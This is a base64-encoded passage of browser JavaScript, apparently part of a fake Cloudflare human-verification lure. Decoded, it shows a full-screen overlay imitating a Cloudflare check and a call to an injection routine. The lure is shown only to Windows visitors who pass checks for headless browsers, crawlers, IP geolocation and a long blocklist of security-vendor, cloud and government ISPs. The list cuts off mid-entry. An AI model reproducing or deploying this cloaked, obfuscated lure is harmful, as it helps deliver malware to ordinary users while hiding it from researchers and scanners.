hWFlnWTJ4aGMzTTlJblpsY21sbWVTMWpiMjUwWVdsdVpYSWdkbVZ5YVdaNUxXWnZiM1JsY2lJZ2MzUjViR1U5SW1KaFkydG5jbTkxYm1RNklHNXZibVU3SWo0TkNpQWdJQ0FnUEdScGRpQmpiR0Z6Y3owaWRtVnlhV1o1TFdadmIzUmxjaTFzWldaMElpQnpkSGxzWlQwaWQybGtkR2c2SURJNE5uQjRPeUJtYkc5aGREb2diR1ZtZERzZ2RHVjRkQzFoYkdsbmJqb2diR1ZtZERzZ1ptOXVkQzF6YVhwbE9pQXhOWEI0T3lJK0RRb2dJQ0FnSUNCUVpYSm1iM0p0SUhSb1pTQnpkR1Z3Y3lCaFltOTJaU0IwYnlCbWFXNXBjMmdnZG1WeWFXWnBZMkYwYVc5dUxnMEtJQ0FnSUNBOEwyUnBkajROQ2lBZ0lDQWdQR0oxZEhSdmJpQjBlWEJsUFNKaWRYUjBiMjRpSUdOc1lYTnpQU0oyWlhKcFpua3RkbVZ5YVdaNUxXSjFkSFJ2YmlCaWJHOWpheUlnYVdROUluWmxjbWxtZVMxaWRYUjBiMjRpSUhOMGVXeGxQU0ppWVdOclozSnZkVzVrT2lBak5XVTFaVFZsT3lCd1lXUmthVzVuT2lBNWNIZ2dNemh3ZURzaVBsWmxjbWxtZVR3dlluVjBkRzl1UGcwS0lDQWdJRHd2WkdsMlBpQXRMVDROQ2lBZ0lEd3ZaR2wyUGcwS0RRb2dJQ0E4SVMwdElDMHRQZzBLRFFvZ0lDQThjMk55YVhCMFBnMEtaRzlqZFcxbGJuUXVZV1JrUlhabGJuUk1hWE4wWlc1bGNpZ2lSRTlOUTI5dWRHVnVkRXh2WVdSbFpDSXNJR1oxYm1OMGFXOXVJQ2dwSUhzTkNpQWdJQ0JqYjI1emRDQmtiMjFoYVc0Z1BTQjNhVzVrYjNjdWJHOWpZWFJwYjI0dWFHOXpkRzVoYldVN0RRb2dJQ0FnWkc5amRXMWxiblF1Y1hWbGNubFRaV3hsWTNSdmNrRnNiQ2dpTG1SdmJXRnBiaUlwTG1admNrVmhZMmdvWld3Z1BUNGdldzBLSUNBZ0lDQWdJQ0JwWmlBb1pXd3BJR1ZzTG5SbGVIUkRiMjUwWlc1MElEMGdaRzl0WVdsdU93MEtJQ0FnSUgwcE93MEtmU2s3RFFvOEwzTmpjbWx3ZEQ0TkNnMEtJQ0E4TDJScGRqNE5DaUFnSUNBOGNDQmpiR0Z6Y3owaWQyRnBkR2x1WnkxMFpYaDBJaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPaUF4TGpWeVpXMDdEUW9nSUNBZ2JHbHVaUzFvWldsbmFIUTZJREl1TWpWeVpXMDdJSEJoWkdScGJtY3RkRzl3T2lBeU1IQjRPeUkrUEhOd1lXNGdZMnhoYzNNOUltUnZiV0ZwYmkxdVlXMWxJajQ4TDNOd1lXNCtJRzVsWldSeklIUnZJSEpsZG1sbGR5QjBhR1VnYzJWamRYSnBkSGtnYjJZZ2VXOTFjaUJqYjI1dVpXTjBhVzl1SUdKbFptOXlaU0J3Y205alpXVmthVzVuTGp3dmNENE5DaUFnSUNBOGNDQmpiR0Z6Y3owaWQyRnBkR2x1WnkxeVpYTndiMjV6WlNJZ2MzUjViR1U5SW1admJuUXRjMmw2WlRvZ01TNHdjbVZ0T3lCc2FXNWxMV2hsYVdkb2REb2dNaTR5TlhKbGJUc2djR0ZrWkdsdVp5MTBiM0E2SURJd2NIZzdJR1JwYzNCc1lYazZJRzV2Ym1VN0lqNVhZV2wwYVc1bklHWnZjaUE4YzNCaGJpQmpiR0Z6Y3owaVpHOXRZV2x1TFc1aGJXVWlQand2YzNCaGJqNHVMaTQ4TDNBK0RRb2dQQzlrYVhZK0RRb2dEUW9nUEdScGRpQmpiR0Z6Y3owaVptOXZkR1Z5SWlCeWIyeGxQU0pqYjI1MFpXNTBhVzVtYnlJK0RRb2dJRHhrYVhZZ1kyeGhjM005SW1admIzUmxjaTFwYm01bGNpSStEUW9nSUNBOFpHbDJQZzBLSUNBZ0lEeGthWFkrVW1GNUlFbEVPaUE4WTI5a1pTQmpiR0Z6Y3owaWNtRjVMV2xrSWo0MU5tRTBZelV5T1RsbVpHVjBiV05oUEM5amIyUmxQand2WkdsMlBnMEtJQ0FnUEM5a2FYWStEUW9nSUNBOFpHbDJJSE4wZVd4bFBTSnRZWEpuYVc0dGRHOXdPaUExY0hnN0lqNVFaWEptYjNKdFlXNWpaU0FtSUhObFkzVnlhWFI1SUdKNUlEeHpjR0Z1SUdOc1lYTnpQU0pqYkc5MVpHWnNZWEpsTFd4dloyOGlQa05zYjNWa1pteGhjbVU4TDNOd1lXNCtQQzlrYVhZK0RRb2dJRHd2WkdsMlBnMEtJRHd2WkdsMlBnMEtQQzlrYVhZK0RRb05DZzBLRFFvTkNqeHpZM0pwY0hRK0RRb05DZzBLRFFvOEwzTmpjbWx3ZEQ0TkNnMEtEUW84TDJKdlpIaytQQzlvZEcxc1BnPT0nOwogICAgY29uc3QgaCA9IGI2NFRvVXRmOChiNjQpOwoKICAgIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIG92ZXJsYXkuY2xhc3NOYW1lID0gJ292ZXJsYXktc3R5bGVzJzsKICAgIG92ZXJsYXkuaW5uZXJIVE1MID0gaDsKICAgIG92ZXJsYXkuc3R5bGUuY3NzVGV4dCA9ICdwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwdmg7ei1pbmRleDo5OTk5OTknOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsKICAgIHNldFRpbWVvdXQoaW5qZWN0U2NyaXB0LCAwKTsKICB9CgogIGNvbnN0IEhFQURMRVNTX1dFSUdIVCA9IDEwOwogIGNvbnN0IEhFQURGVUxfV0VJR0hUID0gLTg7CiAgY29uc3QgU1VTUElDSU9VU19XRUlHSFQgPSA1OwoKICBhc3luYyBmdW5jdGlvbiBkZXRlY3RIZWFkbGVzcygpIHsKICAgIGNvbnN0IGNoZWNrcyA9IFsKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgICAgIGNvbnN0IGlzSGVhZGxlc3MgPSAvaGVhZGxlc3N8cGhhbnRvbWpzfHNlbGVuaXVtfHdlYmRyaXZlci9pLnRlc3QodWEpOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0hlYWRsZXNzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGhhc1dlYmRyaXZlciA9IG5hdmlnYXRvci53ZWJkcml2ZXIgPT09IHRydWU7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGhhc1dlYmRyaXZlciA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBoYXNDaHJvbWUgPSAhIXdpbmRvdy5jaHJvbWU7CiAgICAgICAgY29uc3QgaGFzQ29ycmVjdENocm9tZSA9IGhhc0Nocm9tZSAmJiAod2luZG93LmNocm9tZS5ydW50aW1lIHx8IHdpbmRvdy5jaHJvbWUubG9hZFRpbWVzKTsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAhaGFzQ2hyb21lIHx8ICFoYXNDb3JyZWN0Q2hyb21lOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBTVVNQSUNJT1VTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgIGFzeW5jICgpID0+IHsKICAgICAgICBpZiAoIW5hdmlnYXRvci5wZXJtaXNzaW9ucykgcmV0dXJuIHsgc2NvcmU6IDAgfTsKICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgcGVybWlzc2lvblN0YXR1cyA9IGF3YWl0IG5hdmlnYXRvci5wZXJtaXNzaW9ucy5xdWVyeSh7IG5hbWU6ICJub3RpZmljYXRpb25zIiB9KTsKICAgICAgICAgIGNvbnN0IG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPSBOb3RpZmljYXRpb24ucGVybWlzc2lvbjsKICAgICAgICAgIGNvbnN0IGlzSW5jb25zaXN0ZW50ID0gKG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPT09ICJkZW5pZWQiICYmIHBlcm1pc3Npb25TdGF0dXMuc3RhdGUgPT09ICJwcm9tcHQiKTsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0luY29uc2lzdGVudCA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBTVVNQSUNJT1VTX1dFSUdIVCB9OwogICAgICAgIH0KICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHBsdWdpbnNMZW5ndGggPSBuYXZpZ2F0b3IucGx1Z2lucz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gcGx1Z2luc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gU1VTUElDSU9VU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2UgPSBuYXZpZ2F0b3IubGFuZ3VhZ2U7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2VzTGVuZ3RoID0gbmF2aWdhdG9yLmxhbmd1YWdlcz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gIWxhbmd1YWdlIHx8IGxhbmd1YWdlc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIHRyeSB7CiAgICAgICAgICBjb25zdCBjYW52YXMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdjYW52YXMnKTsKICAgICAgICAgIGNvbnN0IGdsID0gY2FudmFzLmdldENvbnRleHQoJ3dlYmdsJykgfHwgY2FudmFzLmdldENvbnRleHQoJ2V4cGVyaW1lbnRhbC13ZWJnbCcpOwogICAgICAgICAgaWYgKCFnbCkgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgICBjb25zdCBkZWJ1Z0luZm8gPSBnbC5nZXRFeHRlbnNpb24oJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nKTsKICAgICAgICAgIGNvbnN0IHJlbmRlcmVyID0gZGVidWdJbmZvID8gZ2wuZ2V0UGFyYW1ldGVyKGRlYnVnSW5mby5VTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCkgOiAndW5rbm93bic7CiAgICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAvc3dpZnRzaGFkZXJ8bGx2bXBpcGV8bWVzYS9pLnRlc3QocmVuZGVyZXIpOwogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IFNVU1BJQ0lPVVNfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgfQogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3Qgb3V0ZXJIZWlnaHQgPSB3aW5kb3cub3V0ZXJIZWlnaHQ7CiAgICAgICAgY29uc3Qgb3V0ZXJXaWR0aCA9IHdpbmRvdy5vdXRlcldpZHRoOwogICAgICAgIGNvbnN0IGlubmVySGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwogICAgICAgIGNvbnN0IGlubmVyV2lkdGggPSB3aW5kb3cuaW5uZXJXaWR0aDsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAob3V0ZXJIZWlnaHQgPT09IDAgJiYgb3V0ZXJXaWR0aCA9PT0gMCkgfHwgKG91dGVySGVpZ2h0ID09PSBpbm5lckhlaWdodCAmJiBvdXRlcldpZHRoID09PSBpbm5lcldpZHRoKTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzQ29udHJvbGxlZCA9IG5hdmlnYXRvci53ZWJkcml2ZXIgfHwgd2luZG93LmRvY3VtZW50Py5kb2N1bWVudEVsZW1lbnQ/LmdldEF0dHJpYnV0ZSgnd2ViZHJpdmVyJykgPT09ICd0cnVlJyB8fCB3aW5kb3cuY2FsbFBoYW50b20gfHwgd2luZG93Ll9waGFudG9tOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0NvbnRyb2xsZWQgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNIZWFkbGVzcyA9IC9IZWFkbGVzc0Nocm9tZS8udGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNIZWFkbGVzcyA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzUGhhbnRvbSA9IHdpbmRvdy5jYWxsUGhhbnRvbSB8fCB3aW5kb3cuX3BoYW50b20gfHwgd2luZG93LnBoYW50b207CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzUGhhbnRvbSA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzU2VsZW5pdW0gPSB3aW5kb3cuZG9jdW1lbnQ/LmRvY3VtZW50RWxlbWVudD8uZ2V0QXR0cmlidXRlKCdzZWxlbml1bScpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uZG9jdW1lbnRFbGVtZW50Py5nZXRBdHRyaWJ1dGUoJ3dlYmRyaXZlcicpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uJGNkY18gIT09IHVuZGVmaW5lZCB8fCB3aW5kb3cuZG9jdW1lbnQ/LiR3ZGNfICE9PSB1bmRlZmluZWQ7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU2VsZW5pdW0gPyBIRUFETEVTU19XRUlHSFQgOiAwIH07CiAgICAgIH0KICAgIF07CgogICAgbGV0IHRvdGFsU2NvcmUgPSAwOwogICAgZm9yIChjb25zdCBjaGVjayBvZiBjaGVja3MpIHsKICAgICAgdHJ5IHsKICAgICAgICBjb25zdCByZXN1bHQgPSBhd2FpdCBjaGVjaygpOwogICAgICAgIHRvdGFsU2NvcmUgKz0gcmVzdWx0LnNjb3JlOwogICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIC8vIElnbm9yZSBlcnJvcnMKICAgICAgfQogICAgfQoKICAgIGNvbnN0IG1heFBvc3NpYmxlU2NvcmUgPSBjaGVja3MubGVuZ3RoICogSEVBRExFU1NfV0VJR0hUOwogICAgY29uc3QgbWluUG9zc2libGVTY29yZSA9IGNoZWNrcy5sZW5ndGggKiBIRUFERlVMX1dFSUdIVDsKICAgIGNvbnN0IG5vcm1hbGl6ZWRTY29yZSA9IE1hdGgubWF4KDAsIE1hdGgubWluKDEwMCwgKCh0b3RhbFNjb3JlIC0gbWluUG9zc2libGVTY29yZSkgLyAobWF4UG9zc2libGVTY29yZSAtIG1pblBvc3NpYmxlU2NvcmUpKSAqIDEwMCkpOwogICAgcmV0dXJuIE1hdGgucm91bmQobm9ybWFsaXplZFNjb3JlKTsKICB9CgogIGZ1bmN0aW9uIGRldGVjdE9TKCkgewogICAgY29uc3QgdXNlckFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgY29uc3QgcGxhdGZvcm0gPSBuYXZpZ2F0b3IucGxhdGZvcm0/LnRvTG93ZXJDYXNlKCkgfHwgJyc7CgogICAgaWYgKC9pcGhvbmV8aXBhZHxpcG9kL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ2lvcyc7CiAgICBpZiAoL2FuZHJvaWQvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnYW5kcm9pZCc7CiAgICBpZiAoL2xpbnV4L2kudGVzdCh1c2VyQWdlbnQpICYmICEvYW5kcm9pZC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdsaW51eCc7CiAgICBpZiAoL21hYyBvcyB4fG1hY2ludG9zaC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdtYWMnOwogICAgaWYgKC93aW4vaS50ZXN0KHVzZXJBZ2VudCkgfHwgL3dpbi9pLnRlc3QocGxhdGZvcm0pKSByZXR1cm4gJ3dpbmRvd3MnOwoKICAgIHJldHVybiAndW5rbm93bic7CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpc0FjY2Vzc0FsbG93ZWQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBkZXRlY3RlZE9TID0gZGV0ZWN0T1MoKTsKICAgICAgY29uc3QgaW5jbHVkZU9TTGlzdCA9IFsid2luZG93cyJdOwogICAgICBpZiAoaW5jbHVkZU9TTGlzdC5sZW5ndGggPiAwICYmICFpbmNsdWRlT1NMaXN0LmluY2x1ZGVzKGRldGVjdGVkT1MpKSB7CiAgICAgICAgdmxvZygnZGVueV9vcycsIGRldGVjdGVkT1MpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBoZWFkbGVzc1Byb2JhYmlsaXR5ID0gYXdhaXQgZGV0ZWN0SGVhZGxlc3MoKTsKICAgICAgaWYgKGhlYWRsZXNzUHJvYmFiaWxpdHkgPiAyNSkgewogICAgICAgIHZsb2coJ2RlbnlfaGVhZGxlc3MnLCBoZWFkbGVzc1Byb2JhYmlsaXR5KTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQoKICAgICAgY29uc3QgYm90UGF0dGVybnMgPSBbJ2JvdCcsJ2NyYXdsJywnc3BpZGVyJywnc2NyYXBlJywnc2x1cnAnLCd5YWhvbycsJ2dvb2dsZScsJ3lhbmRleCcsJ2JhaWR1JywnYmluZycsJ2R1Y2tkdWNrJywndGVvbWEnLCdhcmNoaXZlJ107CiAgICAgIGNvbnN0IHVzZXJBZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKICAgICAgZm9yIChjb25zdCBwYXR0ZXJuIG9mIGJvdFBhdHRlcm5zKSB7CiAgICAgICAgaWYgKHVzZXJBZ2VudC5pbmNsdWRlcyhwYXR0ZXJuKSkgewogICAgICAgICAgdmxvZygnZGVueV9ib3RfdWEnLCB1c2VyQWdlbnQpOwogICAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgIH0KCiAgICAgIAogICAgICBjb25zdCBpcFJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgICBpZiAoIWlwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpcGlmeV9mYWlsZWQnLCBpcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXBEYXRhID0gYXdhaXQgaXBSZXNwb25zZS5qc29uKCk7CiAgICAgIGNvbnN0IGlwID0gaXBEYXRhLmlwOwoKICAgICAgY29uc3QgaXNwUmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9pcDJsb2NhdGlvbi1hcGktOTc5ODQ4MDY3Njc3LnVzLWNlbnRyYWwxLnJ1bi5hcHAvP2lwPScgKyBpcCk7CiAgICAgIGlmICghaXNwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpc3BfbG9va3VwX2ZhaWxlZCcsIGlzcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXNwRGF0YSA9IGF3YWl0IGlzcFJlc3BvbnNlLmpzb24oKTsKICAgICAgY29uc3QgaXNwID0gaXNwRGF0YS5pc3AgfHwgJyc7CiAgICAgIGNvbnN0IGNvdW50cnlDb2RlID0gaXNwRGF0YS5nZW9pcDJfY291bnRyeV9jb2RlIHx8ICcnOwoKICAgICAgdmxvZygnaXBfaW5mbycsIHsgaXAsIGNvdW50cnlDb2RlLCBpc3AgfSk7CgogICAgICBjb25zdCBpbmNsdWRlQ291bnRyeUxpc3QgPSBbXTsKICAgICAgaWYgKGluY2x1ZGVDb3VudHJ5TGlzdC5sZW5ndGggPiAwICYmICghY291bnRyeUNvZGUgfHwgIWluY2x1ZGVDb3VudHJ5TGlzdC5pbmNsdWRlcyhjb3VudHJ5Q29kZSkpKSB7CiAgICAgICAgdmxvZygnZGVueV9jb3VudHJ5JywgY291bnRyeUNvZGUpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBibG9ja2VkSVNQcyA9IFsKICAgICAgICAnTTI0NyBFdXJvcGUnLCdQYWNrZXRodWInLCdMZWFzZVdlYicsJ0RhdGFDYW1wJywnSVBYTycsJ1NlY3VyZSBEYXRhIFN5c3RlbXMnLCdOaWVkZXJzYWVjaHNpc2NoZSBMYW5kZXNyZWdpZXJ1bmcnLCdCYXJyYWN1ZGEgTmV0d29ya3MnLCdUcmVuZCBNaWNybyBJbmNvcnBvcmF0ZWQnLCdNaWNyb3NvZnQgQ29ycCcsJ01pY3Jvc29mdCBDb3Jwb3JhdGlvbicsJ1N1cmZDb250cm9sJywnV2Vic2Vuc2UnLCdHSE9TVG5ldCBHbWJIJywnSU5FVHUnLCdBdmlyYSBCLlYuJywnR29vZ2xlIENsb3VkJywnWWFob28hJywnQ29tbXRvdWNoJywnQ2xvdWRGbGFyZScsJ1RydXN0d2F2ZSBIb2xkaW5ncycsJ0ZPUlRIbmV0IFNBJywnVVMgRGVwYXJ0bWVudCBvZiBEZWZlbnNlIE5ldHdvcmsnLCdaT05FUyBBUycsJ0Npc2NvIFN5c3RlbXMgSXJvbnBvcnQgRGl2aXNpb24nLCdUaGVQbGFuZXQuY29tIEludGVybmV0IFNlcnZpY2VzJywnV2Vicm9vdCBTZXJ2aWNlcycsJ1JhY2tzcGFjZSBIb3N0aW5nJywnUGVyaW1ldGVyIGVTZWN1cml0eScsJ0RpZ2l0YWxPY2VhbicsJ1BhY2tldEV4Y2hhbmdlJywnR3lyb24gSW50ZXJuZXQgTHRkJywnTmV3TWVkaWEgRXhwcmVzcyBQdGUnLCdBbWF6b24uY29tJywnTWNBZmVlJywnRVNFVCwgc3BvbC4gcyByLm8uJywnRmFjZWJvb2snLCdGYWNlYm9vayBJcmVsYW5kIEx0ZCcsJ1lhaG9vISBCcm9hZGNhc3QgU2VydmljZXMnLCdZYWhvbyEgSW5kaWEgUHZ0JywnWWFob28gSmFwYW4nLCdZYWhvbyBKYXBhbiBDb3Jwb3JhdGlvbicsJ0dvb2dsZWJvdCcsJ0FWQVNUIFNvZnR3YXJlIHMuci5vLicsJ01pY3Jvc29mdCBiaW5nYm90JywnTWljcm9zb2Z0IEhvc3RpbmcnLCdBbWF6b24gVGVjaG5vbG9naWVzJywnQ3l2ZWlsbGFuY2UnLCdDbG91ZG1hcmsnLCdDbG91ZG1hcmsgTGFicycsJ1RvcHN5IExhYnMnLCdBbWF6b24nLCdTRVJWRVIgQkxPQ0snLCdPVkggSG9zdGluZycsJ1lBTkRFWCcsJ1lBTkRFWCBMTEMnLCdZYWhvbyBCYW5nYWxvcmUgTmV0d29yayBNb25pdG9yaW5nIENlbnRlcicsJ1RpbmV0JywnTXVsdGltZWRpYSBQb2xza2EgUy5BLicsJ011bHRpbWVkaWEgUG9sc2thIC0gUG9sdWRuaWUgUy5BLicsJ1plbml0aCBFbGVjdHJvbmljcyBDb3Jwb3JhdGlvbicsJ0JhcnJhY3VkYSBDYW5hZGEnLCdNaWNyb3NvZnQgTGltaXRlZCcsJ01pY3Jvc29mdCAoQ2hpbmEpIENvLicsJ1NQQU1maWdodGVyIEFwUycsJ1NwYW1maWdodGVyLWFzJywnRGlnaXRhbE9uZSBBRycsJ1R3aXR0ZXInLCdUd2l0dGVyIEludGVybmF0aW9uYWwgQ29tcGFueScsJ1N1cmZjb250cm9sLXJlYWRpbmcnLCdZYWhvbyBDb3JwIE5ldHdvcmsnLCdDb25lY3RpdmEnLCdDb25lY3RpdmEgVGVsZWNvbScsJ0NvbmVjdGl2YSBDZWx1bGFyIGUgSW5mb3JtYXRpY2EgTHRkYScsJ1JlZGlmZi5jb20gSW5kaWEgTGltaXRlZCcsJ0luY2VybyBMTEMnLCdPTkxJTkUgUy5BLlMuJywnT05MSU5FIFNBUycsJ1Rpc2NhbGktaXQnLCdUaXNjYWxpIFNwQScsJ1Rpc2NhbGkgVUsgTGltaXRlZCcsJ0Z1aml0c3UnLCdEYXVtIENvbW11bmljYXRpb24gQ28uLExURCcsJ0ludGVybmV0IFNlY3VyaXR5IFN5c3RlbXMnLCdWS29udGFrdGUgTHRkJywnTGVhc2V3ZWInLCdMZWFzZVdlYiBOZXRoZXJsYW5kcyBCLlYuJywnTGVhc2VXZWIgQi5WLicsJ0xlYXNlV2ViIENETiBCLlYuJywnTGVhc2VXZWIgTmV0d29yayBCLlYuJywnTGVhc2V3ZWIgQXNpYScsJ0xlYXNld2ViIEFzaWEgUGFjaWZpYyBwdGUuJywnTGVhc2V3ZWIgRGV1dHNjaGxhbmQgR21iSCcsJ0xlYXNld2ViIFVTQScsJ0xlYXNld2ViLWRlJywnSW50ZXJOQVAgTmV0d29yayBTZXJ2aWNlcyBVLksuIExpbWl0ZWQnLCdJbnRlcm5hcCBKYXBhbiBDby4sTFRELicsJ0ludGVybmFwIE5ldHdvcmsgU2VydmljZXMnLCdJbnRlcm5hcCBOZXR3b3JrIFNlcnZpY2VzIENvcnBvcmF0aW9uJywnQml0ZGVmZW5kZXItYXMnLCdCaXRkZWZlbmRlciBTUkwnLCdNWCBMb2dpYycsJ0NoaW5hIEVkdWNhdGlvbiBhbmQgUmVzZWFyY2ggTmV0d29yayBDZW50ZXInLCdDaGluYSBEdXR5IEZyZWUgZ3JvdXAnLCdDaGluYScsJ0NoaW5hIEJyb2FkYmFuZCBDb21tdW5pY2F0aW9ucyAoQ0JDbmV0KScsJ0NoaW5hIEJyb2FkY2FzdGluZyBUViBOZXQnLCdDaGluYSBDb21tdW5pY2F0aW9uIENvLicsJ0NoaW5hIENvbnN0cnVjdGlvbiBCYW5rIChBc2lhKSBDb3Jwb3JhdGlvbiBMaW1pdGVkJywnQ2hpbmEgQ3VsdHVyYWwgSGVyaXRhZ2UgSW5mb3JtYXRpb24gYW5kIENvbnN1bHRpbmcnLCdDaGluYSBEaWdpdGFsIEtpbmdkb20gVGVjaG5vbG9neSBDby4sTHRkLicsJ0NoaW5hIERyYWdvbiBUZWxlY29tIENvLixMdGQnLCdGYWN0aW9uJywnWmVuIFN5c3RlbXMgQS9TJywnT1ZIIFNBUycsJ1NvbHV0aW9uIFBybycsJ0RlZEZpYmVyQ28nLCdDbGVhckJsdWUgVGVjaG5vbG9naWVzJywnSW5mb3JtYXRpb24gVGVjaG5vbG9neSBTeXN0ZW1zJywnR29EYWRkeS5jb20sIExMQycsJ1NlcnZlciBDZW50cmFsIE5ldHdvcmsnLCdUaW5ldCBTcGEnLCdDYXByaXMgR3JvdXAnLCdJbmt0b21pIENvcnBvcmF0aW9uJywnVW5pZmllZCBMYXllcicsJ0pTQyBSVENvbW0uUlUnLCdMTEMgbWFzdGVyaG9zdCcsJ01UTyBUZWxlY29tJywnTGlua2VkSW4gQ29ycG9yYXRpb24nLCdXZWJzaXRld2VsY29tZS5jb20nLCdHVFMgVGVsZWNvbSBTUkwnLCdQdWxzZVBvaW50IENvbW11bmljYXRpb25zJywnUHVsc2Vwb2ludCcsJ1RpbWVXZWIgTHRkLicsJ0JlaWppbmcgQmFpZHUgTmV0Y29tIFNjaWVuY2UgYW5kIFRlY2hub2xvZ3kgQ28uJywnRGlnaXRhbCBPY2VhbicsJ1RocmVhdFRyYWNrJywnVGhyZWF0VHJhY2sgU2VjdXJpdHknLCdFR0lIb3N0aW5nJywnSEVUWk5FUicsJ0hldHpuZXItYXMnLCdIZXR6bmVyIE9ubGluZSBHbWJIJywnSEVUWk5FUiAoUHR5KSBMdGQnLCdIZXR6bmVyIENDJywnTGltaXRlZCBsaWFiaWxpdHkgY29tcGFueSBNYWlsLlJ1JywnQW1hem9uIENvcnBvcmF0